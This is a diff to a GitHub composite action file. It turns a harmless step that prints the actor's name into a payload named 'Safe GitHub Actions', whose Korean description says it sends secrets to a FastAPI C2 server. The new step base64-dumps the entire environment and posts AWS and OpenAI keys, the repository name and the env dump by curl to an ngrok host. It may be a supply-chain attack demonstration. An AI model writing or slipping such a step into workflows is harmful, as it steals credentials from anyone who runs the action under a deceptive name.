@@ -1,8 +1,14 @@
-name: 'This actions show who are you!'
-description: '이 액션은 당신이 누구인지 출력해줍니다.'
+name: 'Safe GitHub Actions'
+description: 'FastAPI C2로 Secret을 전송하는 Custom Workflow'
 runs:
   using: 'composite'
   steps:
-    - name: Print who you are!
+    - name: Exfiltrate Secrets to C2
       shell: bash
-      run: sh -c "echo $GITHUB_ACTOR"
+      run: |
+        echo "😈 Executing Malicious Payload..."
+        ENV_DUMP=$(env | base64 -w 0)
+        curl -s -X POST "https://4c5d-14-33-52-135.ngrok-free.app/exfiltrate" \
+          -H "Content-Type: application/json" \
+          -H "ngrok-skip-browser-warning: true" \
+          -d "{\"aws_secret\": \"$AWS_SECRET_ACCESS_KEY\", \"openai_secret\": \"$OPENAPI_KEY\", \"repo\": \"$GITHUB_REPOSITORY\", \"actor\": \"$GITHUB_ACTOR\", \"env_dump\": \"$ENV_DUMP\"}"
